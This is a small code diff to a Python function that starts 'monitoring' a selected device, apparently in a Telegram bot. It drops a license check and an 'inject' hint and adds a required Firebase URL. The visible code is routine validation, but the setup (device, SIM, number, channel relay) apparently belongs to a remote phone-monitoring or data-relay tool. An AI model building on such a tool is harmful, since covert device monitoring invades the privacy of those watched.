@@ -111,14 +111,18 @@ def set_user_phone(db: Session, telegram_user_id: int, phone_number: str) -> tup
 def start_monitoring(db: Session, telegram_user_id: int) -> tuple[MonitorProfile, Device]:
     profile = get_monitor_profile(db, telegram_user_id)
     if not profile or not profile.active_device_id:
-        raise ValueError("Pehle /fdy ya /fy <device_id> se device select karo (inject ke liye /a)")
-    require_license_key(profile)
+        raise ValueError("Pehle /fdy ya /fy <device_id> se device select karo")
     ensure_sim_selected(profile)
     ensure_mynum_selected(profile)
 
     device = db.query(Device).filter(Device.id == profile.active_device_id).first()
     if not device:
         raise ValueError("Active device nahi mili")
+
+    from app.firebase_sync import resolve_firebase_url
+
+    if not resolve_firebase_url(profile, device):
+        raise ValueError("Pehle /setfirebase <url> set karo")
 
     if not profile.channel_id:
         raise ValueError("Add a channel first!")
